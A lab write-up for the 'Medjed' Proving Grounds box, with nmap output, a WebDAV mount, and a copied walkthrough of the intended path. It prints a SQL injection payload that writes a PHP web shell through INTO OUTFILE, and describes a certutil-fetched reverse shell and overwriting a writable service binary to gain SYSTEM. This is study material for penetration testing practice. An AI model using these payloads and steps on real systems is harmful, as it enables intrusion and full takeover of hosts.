# Recon

```sh
nmap -sC -sV -Pn -oA medjed 192.168.155.127
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 15:17 CST
Nmap scan report for 192.168.155.127
Host is up (0.048s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   JavaRMI, LDAPSearchReq, NCP, NULL, SMBProgNeg, WMSRequest, oracle-tns: 
|_    Host '192.168.45.5' is not allowed to connect to this MariaDB server
8000/tcp open  http-alt      BarracudaServer.com (Windows)
|_http-server-header: BarracudaServer.com (Windows)
| http-methods: 
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Windows)
|   Server Date: Sat, 04 Mar 2023 21:20:19 GMT
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_http-title: Home
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| fingerprint-strings: 
|   FourOhFourRequest, Socks5: 
|     HTTP/1.1 200 OK
|     Date: Sat, 04 Mar 2023 21:18:07 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines, GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 04 Mar 2023 21:18:01 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 04 Mar 2023 21:18:13 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 04 Mar 2023 21:19:23 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.93%I=7%D=3/4%Time=6403B553%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4B,"G\0\0\x01\xffj\x04Host\x20'192\.168\.45\.5'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,4
SF:B,"G\0\0\x01\xffj\x04Host\x20'192\.168\.45\.5'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchReq,4
SF:B,"G\0\0\x01\xffj\x04Host\x20'192\.168\.45\.5'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4B,"G\0\0\x
SF:01\xffj\x04Host\x20'192\.168\.45\.5'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server")%r(JavaRMI,4B,"G\0\0\x01\xff
SF:j\x04Host\x20'192\.168\.45\.5'\x20is\x20not\x20allowed\x20to\x20connect
SF:\x20to\x20this\x20MariaDB\x20server")%r(WMSRequest,4B,"G\0\0\x01\xffj\x
SF:04Host\x20'192\.168\.45\.5'\x20is\x20not\x20allowed\x20to\x20connect\x2
SF:0to\x20this\x20MariaDB\x20server")%r(oracle-tns,4B,"G\0\0\x01\xffj\x04H
SF:ost\x20'192\.168\.45\.5'\x20is\x20not\x20allowed\x20to\x20connect\x20to
SF:\x20this\x20MariaDB\x20server");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.93%I=7%D=3/4%Time=6403B559%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2004\x20Mar\x202
SF:023\x2021:18:01\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\
SF:)\r\nConnection:\x20Close\r\n\r\n")%r(GetRequest,72,"HTTP/1\.1\x20200\x
SF:20OK\r\nDate:\x20Sat,\x2004\x20Mar\x202023\x2021:18:01\x20GMT\r\nServer
SF::\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\
SF:n")%r(FourOhFourRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x20
SF:04\x20Mar\x202023\x2021:18:07\x20GMT\r\nServer:\x20BarracudaServer\.com
SF:\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(Socks5,72,"HTTP/1\.
SF:1\x20200\x20OK\r\nDate:\x20Sat,\x2004\x20Mar\x202023\x2021:18:07\x20GMT
SF:\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Cl
SF:ose\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,
SF:\x2004\x20Mar\x202023\x2021:18:13\x20GMT\r\nServer:\x20BarracudaServer\
SF:.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(RTSPRequest,72,
SF:"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2004\x20Mar\x202023\x2021:18:
SF:13\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnecti
SF:on:\x20Close\r\n\r\n")%r(SIPOptions,13C,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nDate:\x20Sat,\x2004\x20Mar\x202023\x2021:19:23\x20GMT\r\nServer
SF::\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\nCon
SF:tent-Type:\x20text/html\r\nCache-Control:\x20no-store,\x20no-cache,\x20
SF:must-revalidate,\x20max-age=0\r\n\r\n<html><body><h1>400\x20Bad\x20Requ
SF:est</h1>Can't\x20parse\x20request<p>BarracudaServer\.com\x20\(Windows\)
SF:</p></body></html>");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: 1m01s
| smb2-time: 
|   date: 2023-03-04T21:20:22
|_  start_date: N/A

```

# Execution

Found that I could connect to a Baracudda server. I setup the admin user account with user: admin and password: password123

I was then able to find that it was a webdav so I followed these instructions.
https://sleeplessbeastie.eu/2017/09/04/how-to-mount-webdav-share/

```sh
sudo apt-get install davfs2
sudo mkdir /home/kali/OPG/medjed/webdav
sudo mount -t davfs -o noexec http://192.168.155.127/fs /home/kali/OPG/medjed/webdav
```
I then had access as administrator to browse around the files.

# Conclusion - Broken?

This does not appear to be the intended method and I would bet a script broke. Has been broken since 2021 according to posts. I reset for good measure and got the same thing.

# Write-up - If it was working
This writeup is what it was supposed to be according to others. https://defaultcredentials.com/ctf/medjed-proving-grounds-walkthrough/

MedJed is rated as “Hard” by the Offensive Security community. I personally found the box a little bit frustrating as there was a lot of guesswork that was done, especially in the early stages of the box. Nevertheless, it’s always fun to eventually figure it out and notch up another machine.

We start with nmap;

```
sudo nmap -sC -p- 192.168.247.127 -oA nmap/full
```

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-41.png)

We have SQL on port 3306 which we cannot log into, a bunch of RPC ports, and some HTTP servers on port 33033, 45332, 45443. Let’s try logging into the FTP server, which is located on port 30021. It was hanging a lot for me.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-24.png)

I used Filezilla and was able to browse the files. There are some config files there but I couldn’t find anything of note and we cannot write to the directories.

We enumerate the websites. There is nothing there, but always great to look for interesting information on the phpinfo.php pages, as this can reveal web server details and possible paths to exploit.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-76.png)

Jump over to the webserver, starting with 33033. Looks like some kind of CMS, but our attention is drawn to the cat.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-26.png)

There is also a Login and passpassword reset button

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-27.png)

After spending what felt like forever, we managed to reset the password for account “jerren.devops” with the following. I tried all the profiles with words listed on the page for the “reminder” section. Importantly, during this time, we had started GoBuster on the other ports in case this didn’t work out. I very nearly gave up here. Like a lot of people, I think I got lucky, which is why I don’t really like the box. Perseverance counts.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-28.png)

From there we go into the profile;

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-25.png)

And then Edit;

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-29.png)

We get a big hint in regards to the SLUG request, which looks like querying a MySQL database. Let’s test to see if it’s vulnerable to SQL injection by inputting a single quotation mark.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-42.png)

Looks like this is vulnerable to SQLi, and the vulnerable query is also revealed;

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-31.png)

We should be able to write a basic php shell to this machine and run commands on it from our Kali machine.

We enter the following into the SLUG request field. We can enumerate the base install path for Xampp via the phpinfo page we saw before.

```
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -' 
 
```

When we hit Request we don’t get an error on our page and note that the URL has changed. We can attempt to run some commands using our new shell by using curl.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-77.png)

Awesome! Let’s try to upload a proper reverse shell onto the box and execute it. I create a reverse shell using msfvenom. I am going to use the certutil command on my php shell to call back to my Kali box, but we will need to URL encode the command to account for the spaces and characters in the link.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-32.png)

Paste the certutil command onto the end of our php shell. Make sure you HTTP server is up and running on your Kali machine.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-34-1024x122.png)

Setup our netcat listener and execute the shell by once again amending the command to run the reverse shell.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-33.png)

And we get our shell back!

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-35.png)

Running WinPeas on the machine we find an entry noting we have write privileges to a file that is part of the BarracudaDrive service. This means we can overwrite this file, and restart the service/machine and potentially escalate privileges.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-36.png)

We can double-check the privileges using icacls.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-37.png)

We can use the same reverse shell we uploaded via our basic php shell, and use it to simply overwrite the vulnerable bd.exe. Use the following command.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-38.png)

We then issue the restart command and restart our netcat listener.

```
shutdown -r
```

We wait a minute for the machine to restart…and we get our shell back as SYSTEM.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/07/image-39.png)